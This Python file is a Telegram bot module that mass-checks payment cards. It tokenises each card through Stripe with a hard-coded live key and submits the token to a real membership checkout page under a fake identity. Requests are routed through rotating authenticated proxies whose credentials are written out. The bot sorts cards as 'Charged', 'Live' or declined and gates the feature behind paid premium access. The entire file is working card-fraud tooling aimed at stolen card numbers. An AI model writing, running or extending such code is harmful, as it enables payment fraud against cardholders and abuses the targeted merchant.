import time
import random
import string
import re
import asyncio
import json
from EQUROBOT import app
from EQUROBOT.core.mongo import has_premium_access
from aiohttp import ClientSession
from pyrogram import filters
from fake_useragent import UserAgent
from config import OWNER_ID

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

proxy_list = [
    "http://nzvuwsmz:yS6ks569Hy@65.181.174.194:63829",
    "http://nzvuwsmz:yS6ks569Hy@65.181.171.160:62110",
    "http://nzvuwsmz:yS6ks569Hy@65.181.167.98:63631",
    "http://nzvuwsmz:yS6ks569Hy@65.181.170.115:60681",
    "http://nzvuwsmz:yS6ks569Hy@65.181.172.225:59225"
]


def round_robin_proxy(proxy_list):
    while True:
        for proxy in proxy_list:
            yield proxy


proxy_gen = round_robin_proxy(proxy_list)

names = ['Jarvis', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William']
last_names = ['Sir', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez']
streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln']
cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
phones = ['682', '346', '246']
state_data = {'NY': 'New York', 'CA': 'California', 'TX': 'Texas', 'FL': 'Florida'}
zips = {'NY': '10001', 'CA': '90001', 'TX': '75001', 'FL': '33101'}


def generate_complex_id():
    return "-".join(
        [
            "".join(random.choice(string.hexdigits.lower()) for _ in range(8)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(4)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(4)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(4)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(24)),
        ]
    )


def generate_custom_id():
    return "-".join(
        [
            "".join(random.choice(string.hexdigits.lower()) for _ in range(8)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(4)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(4)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(4)),
            "".join(random.choice(string.hexdigits.lower()) for _ in range(12))
            + "".join(random.choice(string.hexdigits.lower()) for _ in range(7)),
        ]
    )


def generate_random_profile():
    name = random.choice(names).capitalize()
    last = random.choice(last_names).capitalize()
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    city = random.choice(cities)
    state_code = random.choice(list(state_data.keys()))
    state = state_data[state_code]
    zip_code = zips[state_code]
    phone = f"{random.choice(phones)}{random.randint(1000000, 9999999)}"
    email = f"{name.lower()}.{last.lower()}{random.randint(0, 9999)}@gmail.com"
    username = f"{name.lower()}.{last.lower()}{random.randint(0, 9999)}"

    return {
        "name": name,
        "last": last,
        "street": street,
        "city": city,
        "state_code": state_code,
        "state": state,
        "zip_code": zip_code,
        "phone": phone,
        "email": email,
        "username": username,
    }


def GetStr(string, start, end):
    if start in string and end in string:
        try:
            return string.split(start)[1].split(end)[0]
        except IndexError:
            return ""
    return ""


async def check_card(card_info, proxy, profile):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return f"Invalid card details for `{card_info}`."

    cc, mm, yy, cvv = card
    results = []

    async with ClientSession() as session:
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UserAgent().random,
        }

        stripe_data = {
            "type": "card",
            "billing_details[address][line1]": profile["street"],
            "billing_details[address][city]": profile["city"],
            "billing_details[address][state]": profile["state_code"],
            "billing_details[address][postal_code]": profile["zip_code"],
            "billing_details[address][country]": "US",
            "billing_details[name]": f"{profile['name']} {profile['last']}",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "guid": generate_complex_id(),
            "muid": generate_complex_id(),
            "sid": generate_custom_id(),
            "key": "pk_live_WafveUvMcUoY2W8xx3mYSBxR",
        }

        async with session.post(
            stripe_url, headers=stripe_headers, data=stripe_data, proxy=proxy
        ) as response:
            if response.status != 200:
                try:
                    error_json = await response.json()
                    error_status = error_json.get("error", {}).get(
                        "decline_code", "Unknown error"
                    )
                    error_message = error_json.get("error", {}).get(
                        "message", "Unknown error"
                    )
                except json.JSONDecodeError:
                    error_message = "Unknown error"
                    error_status = "Error ⚠️"
                return f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {error_status} ❌\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {error_message}\n"

            response_data = await response.json()
            token = response_data.get("id", None)
            l4 = response_data.get("card", {}).get("last4", "Unknown")

        if not token:
            return "Failed to retrieve token."

        second_url = "https://amralive.com/membership-account/membership-checkout/"
        headers2 = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UserAgent().random,
        }

        data2 = {
            "level": "1",
            "checkjavascript": "1",
            "username": profile["username"],
            "password": f"{profile['name']}12345",
            "password2": f"{profile['name']}12345",
            "bemail": profile["email"],
            "bconfirmemail": profile["email"],
            "bfirstname": profile["name"],
            "blastname": profile["last"],
            "baddress1": profile["street"],
            "bcity": profile["city"],
            "bstate": profile["state_code"],
            "bzipcode": profile["zip_code"],
            "bcountry": "US",
            "bphone": profile["phone"],
            "CardType": "visa",
            "submit-checkout": "1",
            "javascriptok": "1",
            "payment_method_id": token,
            "AccountNumber": f"XXXXXXXXXXXX{l4}",
            "ExpirationMonth": mm,
            "ExpirationYear": yy,
        }

        async with session.post(
            second_url, headers=headers2, data=data2
        ) as second_response:
            result = await second_response.text()
            Respo = GetStr(
                result,
                '<div id="pmpro_message" class="pmpro_message pmpro_error">',
                "</div>",
            )

        if (
            "Your card does not support this type of purchase." in result
            or "not support" in result
            or "card does not support" in result
            or '"type":"one-time"' in result
        ):
            status = "Approved ✅"
            resp = "Approved CVV"

        elif (
            '"result":"success"' in result
            or '"Thank you. Your order has been received."' in result
            or "SUCCEEDED" in result
            or "APPROVED" in result
            or '"success"' in result
        ):
            status = "Charged 🔥"
            resp = "Payment Successful ✅"

        elif (
            "Invalid account" in result
            or "account_Invalid" in result
            or '"Invalid account": "fail"' in result
        ):
            status = "CCN 🌿"
            resp = "Invalid Account"

        elif (
            '"code":"incorrect_cvc"' in result
            or "security code is incorrect." in result
            or "Your card&#039;s security code is incorrect." in result
            or "incorrect_cvc" in result
            or '"cvc_check": "fail"' in result
            or "security code is invalid." in result
        ):
            status = "CCN Live ✅"
            resp = "Invalid security code"

        elif (
            '"cvc_check":"pass"' in result
            or "Your card zip code is incorrect." in result
            or '"type":"one-time"' in result
            or "incorrect_zip" in result
        ):
            status = "Live ✅"
            resp = "CVV Live"

        elif "requires_action" in result:
            status = "CCN Live ✅"
            resp = "Card Requires Customer Verificationn"

        elif (
            "Insufficient funds" in result
            or "Your card has insufficient funds." in result
            or "insufficient_funds" in result
        ):
            status = "Card Live ✅"
            resp = "Insufficient Funds 💰"

        elif Respo:
            status = "Declined ❌"
            resp = f"{Respo}"

        else:
            status = "Error ⚠️"
            resp = "Unknown error"

        resp = resp.replace("Error updating default payment method.", "").strip()

        results.append(
            f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"
        )

    return "\n".join(results)


async def process_cards_concurrently(cards_info):
    tasks = []
    for card_info in cards_info:
        proxy = next(proxy_gen)
        profile = generate_random_profile()
        tasks.append(check_card(card_info, proxy, profile))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results


@app.on_message(filters.command("msvv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    card_info_text = None

    if message.reply_to_message:
        card_matches = re.findall(card_pattern, message.reply_to_message.text)
        if card_matches:
            card_info_text = "\n".join(["|".join(match) for match in card_matches])

    if not card_info_text:
        try:
            card_info_text = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            await message.reply(
                "Please provide card details in the format: `card_number|mm|yy|cvv`."
            )
            return

    cards_info = card_info_text.split("\n")[:30]
    if len(cards_info) > 30:
        await message.reply(
            "The maximum number of cards allowed is 30. Please reduce the number of cards and try again."
        )
        return

    processing_msg = await message.reply("Processing your request...")
    start_time = time.time()

    try:
        results = await process_cards_concurrently(cards_info[:10])

        final_response = "𝗠𝗮𝘀𝘀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗦𝗶𝘁𝗲𝗯𝗮𝘀𝗲𝗱\n\n"
        final_response += "\n\n".join(results)
        final_response += f"\n\n𝗧𝗶𝗺𝗲: {round(time.time() - start_time, 2)}s\n𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={message.from_user.id})"

        await processing_msg.edit_text(final_response)

    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
